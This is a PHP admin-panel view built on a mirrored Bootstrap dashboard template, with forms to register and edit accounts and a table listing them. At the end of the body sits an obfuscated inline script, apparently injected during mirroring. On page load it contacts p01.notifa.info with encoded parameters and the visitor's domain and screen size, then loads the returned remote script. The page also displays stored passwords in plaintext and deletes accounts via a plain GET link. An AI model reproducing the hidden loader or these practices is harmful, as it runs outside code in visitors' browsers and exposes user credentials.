<?php   ?>

<!doctype html>
<html lang="en">


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/chat-box.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:13:26 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Amfan - Responsive Bootstrap Admin &amp; Dashboard Template</title>

    <!-- Favicon -->
    <link rel="icon" href="<?= BASEURL;?>/AssetAdmin/img/core-img/favicon.png">

    <!-- These plugins only need for the run this page -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/notification.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/c3.min.css">

    <!-- Master Stylesheet [If you remove this CSS file, your file will be broken undoubtedly.] -->
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/style1.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?= BASEURL;?>/AssetAdmin/css/default-assets/themify-icons.css">

</head>

<body>
<!-- Preloader -->
<div id="droba-loader">
    <div class="loader"></div>
</div>
<!--Preloader-->

<!-- Setting Panel -->
<div class="theme-setting-wrapper">
    <div id="settings-trigger"><i class="ti-settings font-17"></i></div>
    <div id="theme-settings" class="settings-panel">
        <i class="settings-close zmdi zmdi-close font-18 font-weight-bold"></i>
        <p class="settings-heading font-18">Side Menu Color :</p>
        <div class="sidebar-bg-options selected" id="sidebar-dark-theme">
            <div><span class="font-14 font-weight-bold">Default</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-light-theme">
            <div><span class="font-14 font-weight-bold">Light</span></div>
        </div>
        <div class="sidebar-bg-options" id="sidebar-color-theme">
            <div><span class="font-14 font-weight-bold">Colorfull</span></div>
        </div>
    </div>
</div>

<!-- ======================================
******* Page Wrapper Area Start **********
======================================= -->
<div class="ecaps-page-wrapper">
    <!-- Sidemenu Area -->
    <div class="ecaps-sidemenu-area">
        <!-- Desktop Logo -->
        <div class="ecaps-logo">
            <a href="index.html"><img class="desktop-logo" src="<?= BASEURL;?>/AssetAdmin/img/core-img/logo.png" alt="Desktop Logo"> <img class="small-logo" src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
        </div>

        <!-- Side Nav -->
        <div class="ecaps-sidenav" id="ecapsSideNav">
            <!-- Side Menu Area -->
            <div class="side-menu-area">
                <!-- Sidebar Menu -->
                <nav>
                    <ul class="sidebar-menu" data-widget="tree">
                        <li><a href="<?= BASEURL;?>/homeadmin"><i class="zmdi zmdi-view-dashboard"></i><span>Dashboard</span></a></li>
                        <li class="treeview active">
                            <a href="javascript:void(0)"><i class="zmdi zmdi-apps"></i> <span>Apps</span> <i class="fa fa-angle-right"></i></a>
                            <ul class="treeview-menu">
                                <li class="active"><a href="#">Data Akun</a></li>
                                <li><a href="<?= BASEURL;?>/page">Data Berita</a></li>
                            </ul>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <!-- Page Content -->
    <div class="ecaps-page-content">
        <!-- Top Header Area -->
        <header class="top-header-area d-flex align-items-center justify-content-between">
            <div class="left-side-content-area d-flex align-items-center">
                <!-- Mobile Logo -->
                <div class="mobile-logo mr-3 mr-sm-4">
                    <a href="index.html"><img src="<?= BASEURL;?>/AssetAdmin/img/core-img/small-logo.png" alt="Mobile Logo"></a>
                </div>

                <!-- Triggers -->
                <div class="ecaps-triggers mr-1 mr-sm-3">
                    <div class="menu-collasped" id="menuCollasped">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                    <div class="mobile-menu-open" id="mobileMenuOpen">
                        <i class="zmdi zmdi-menu"></i>
                    </div>
                </div>

                <!-- Left Side Nav -->
                <ul class="left-side-navbar d-flex align-items-center">
                    <li class="hide-phone app-search">
                        <form class="input-group" role="search">
                            <input type="text" class="form-control" placeholder="Search Projects.." aria-label="search">
                        </form>
                    </li>
                </ul>
            </div>

            <div class="right-side-navbar d-flex align-items-center justify-content-end">
                <!-- Mobile Trigger -->
                <div class="right-side-trigger" id="rightSideTrigger">
                    <i class="ti-align-left"></i>
                </div>

                <!-- Top Bar Nav -->
                <ul class="right-side-content d-flex align-items-center">
                    <!-- Full Screen Mode -->
                    <li class="full-screen-mode ml-1">
                        <a href="javascript:" id="fullScreenMode"><i class="zmdi zmdi-fullscreen"></i></a>
                    </li>
                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle font-15 text-dark" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">English<i class="arrow_carrot-down"></i></button>
                        <div class="dropdown-menu language-dropdown dropdown-menu-right">
                            <a href="#" class="dropdown-item">French</a>
                            <a href="#" class="dropdown-item">German</a>
                            <a href="#" class="dropdown-item">Hindi</a>

                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="zmdi zmdi-shopping-basket" aria-hidden="true"></i></button>

                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- Top Message Area -->
                            <div class="top-message-area">
                                <!-- Heading -->
                                <div class="top-message-heading">
                                    <div class="heading-title">
                                        <h6>Messages</h6>
                                    </div>
                                    <span>5 New</span>
                                </div>
                                <div class="message-box" id="messageBox">
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/1.png" alt="">
                                        <span class="message-text">
                                                <span>6-hour video course on Angular</span>
                                                <span>3 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/2.png" alt="">
                                        <span class="message-text">
                                                <span>Google Ads: You'll get a refund soon</span>
                                                <span>27 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/3.png" alt="">
                                        <span class="message-text">
                                                <span>New Feature: HTTP Method Selection</span>
                                                <span>56 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/4.png" alt="">
                                        <span class="message-text">
                                                <span>The Complete JavaScript Handbook</span>
                                                <span>1 hour ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/5.png" alt="">
                                        <span class="message-text">
                                                <span>New comment: ecaps Template</span>
                                                <span>2 days ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/6.png" alt="">
                                        <span class="message-text">
                                                <span>6-hour video course on Angular</span>
                                                <span>3 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/7.png" alt="">
                                        <span class="message-text">
                                                <span>Google Ads: You'll get a refund soon</span>
                                                <span>27 min ago</span>
                                            </span>
                                    </a>
                                    <a href="#" class="dropdown-item">
                                        <img src="<?= BASEURL;?>/AssetAdmin/img/member-img/8.html" alt="">
                                        <span class="message-text">
                                                <span>New Feature: HTTP Method Selection</span>
                                                <span>56 min ago</span>
                                            </span>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="zmdi zmdi-volume-up" aria-hidden="true"></i> <span class="active-status"></span></button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- Top Notifications Area -->
                            <div class="top-notifications-area">
                                <!-- Heading -->
                                <div class="notifications-heading">
                                    <div class="heading-title">
                                        <h6>Notifications</h6>
                                    </div>
                                    <span>5 New</span>
                                </div>

                                <div class="notifications-box" id="notificationsBox">
                                    <a href="#" class="dropdown-item"><i class="ti-face-smile bg-success"></i><span>We've got something for you!</span></a>
                                    <a href="#" class="dropdown-item"><i class="zmdi zmdi-notifications-active bg-danger"></i><span>Domain names expiring on Tuesday</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-check"></i><span>Your commissions has been sent</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-heart bg-success"></i><span>You sold an item!</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-bolt bg-warning"></i><span>Security alert for your linked Google account</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-face-smile bg-success"></i><span>We've got something for you!</span></a>
                                    <a href="#" class="dropdown-item"><i class="zmdi zmdi-notifications-active bg-danger"></i><span>Domain names expiring on Tuesday</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-check"></i><span>Your commissions has been sent</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-heart bg-success"></i><span>You sold an item!</span></a>
                                    <a href="#" class="dropdown-item"><i class="ti-bolt bg-warning"></i><span>Security alert for your linked Google account</span></a>
                                </div>
                            </div>
                        </div>
                    </li>

                    <li class="nav-item dropdown">
                        <button type="button" class="btn dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><img src="<?= BASEURL;?>/AssetAdmin/img/member-img/3.png" alt=""></button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <!-- User Profile Area -->
                            <div class="user-profile-area">
                                <div class="user-profile-heading">
                                    <!-- Thumb -->
                                    <div class="profile-img">
                                        <img class="chat-img mr-2" src="<?= BASEURL;?>/AssetAdmin/img/member-img/3.png" alt="">
                                    </div>
                                    <!-- Profile Text -->
                                    <div class="profile-text">
                                        <h6>Ajoy Das</h6>
                                        <span>Developer</span>
                                    </div>
                                </div>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-account profile-icon bg-primary" aria-hidden="true"></i> My profile</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-email-open profile-icon bg-success" aria-hidden="true"></i> Messages</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-brightness-7 profile-icon bg-info" aria-hidden="true"></i> Account settings</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-mouse profile-icon bg-danger" aria-hidden="true"></i> My Tasks</a>
                                <a href="#" class="dropdown-item"><i class="zmdi zmdi-wifi-alt profile-icon bg-purple" aria-hidden="true"></i> Support</a>
                                <a href="#" class="dropdown-item"><i class="ti-unlink profile-icon bg-warning" aria-hidden="true"></i> Sign-out</a>
                            </div>
                        </div>
                    </li>
                </ul>
            </div>
        </header>

        <!-- Main Content Area -->
        <div class="main-content">
            <div class="col-12 box-margin">
                <div class="card">
                    <div class="card-body">
                        <div class="stacked-form-area">
                            <h4 class="card-title">Daftarkan Akun</h4>
                            <form action="<?= BASEURL;?>/buatakun/tambahakun" method="post">
                                <label for="fname">Username</label>
                                <input type="text" id="fname" name="user" placeholder="Username">
                                <label for="lname">Password</label>
                                <input type="text" id="lname" name="pass" placeholder="Password">

                                <input class="btn btn-primary btn-block mt-15" type="submit" value="Submit">
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-12 box-margin">
                <div class="card">
                    <div class="card-body">
                        <div class="stacked-form-area">
                            <h4 class="card-title">Mengubah Data Akun</h4>
                            <form action="<?= BASEURL;?>/buatakun/ubahakun1" method="post">
                                <?php foreach ($this->tampungsementara1 as $tam):  ?>
                                <label for="fname">Username</label>
                                <input type="text" id="fname" value="<?= $tam['Username']?>" name="user1" placeholder="Username">
                                <label for="lname">Password</label>
                                <input type="text" id="lname" value="<?= $tam['Password']?>" name="pass1" placeholder="Password">

                                <input class="btn btn-primary btn-block mt-15" type="submit" value="Simpan Perubahan">

                                <?php endforeach; ?>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row" id="basic-table">
                <div class="col-12 box-margin">
                    <div class="card">
                        <div class="card-content">
                            <div class="card-body">
                                <h4 class="card-title">Basic Tables</h4>
                                <!-- Table with outer spacing -->
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead>
                                        <tr>
                                            <th>ID</th>
                                            <th>Username</th>
                                            <th>Password</th>
                                            <th>Delete</th>
                                        </tr>
                                        </thead>
                                        <tbody>

                                        <?php  foreach ($this->tampungsementara as $tabel1): ?>
                                        <tr>
                                            <td ><?=  $tabel1['id_akun']; ?></td>
                                            <td   class="text-bold-500" ><?= $tabel1['Username']; ?></td>
                                            <td ><?= $tabel1['Password']; ?></td>
                                            <?php if ($_SESSION['username']==$tabel1['Username']): ?>
                                                <td><a href="<?=BASEURL; ?>/buatakun/hapusakun"><i class="icon-envelope btn btn-info btn-circle">DEL</i></a></td>
                                            <?php endif;?>
                                        </tr>
                                        <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

<!-- ======================================
********* Page Wrapper Area End ***********
======================================= -->

<!-- Must needed plugins to the run this Template -->
<script src="<?= BASEURL;?>/AssetAdmin/js/jquery.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/popper.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bootstrap.min.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/bundle.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/setting.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/fullscreen.js"></script>

<!-- Active JS -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/active.js"></script>

<!-- These plugins only need for the run this page -->
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/chat-box.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/bootstrap-growl.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/notification-active.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/SimpleTableCellEditor.js"></script>
<script src="<?= BASEURL;?>/AssetAdmin/js/default-assets/edittable-active.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXqtyRNyMjONZ22q1QKiV039ekgAT2ThLHTX3bAFW3a5dnP8XjxALD6nBtgzLbAus96a7ExAW2ORKBp6w%2f9xdFizoz7bl0KP3WA57zbjIC1i%2f700h%2f6RcmUpwTq7gIXttx3UQ64%2fPZeEtqtAWzLfmy%2fLfsc51EfPTM%2blCJmBUHJBJnyVXKJ9iJSP94Rnw%2fupmFjJM2SqkV5E8Z%2bIAtXGbh7%2fqDXWFLWzWqCH7%2fmbGJ4NxllDcsH%2btJf%2bgb291bc%2fF5KiiPkvxr3gOJAxrfax3QJLhCykGj1LqWY%2bA263SFcTtL6zdXJKrs7sG9%2f1Ht3wdP01KFvW1YOdbkwZk0KaJw%2fXIzze7sJoUa%2bHuT1wccqA1zgnBGLoy52HbwBuoox1sa9%2b1AVbeg816d3eIDEMILSNxsZaNy5CY55CSRYJVb4%2b05%2f33Uh6eNFcVJjGOdOICJYA8NFjL3dlHlPacD0HmlNnOcFU4IOhz3Iq3Affv%2fneAe%2bjfnT6r1pGC2QdzmjGDJ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from demo.riktheme.com/amfan/side-menu-2/chat-box.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 06 Jun 2020 02:13:50 GMT -->
</html>
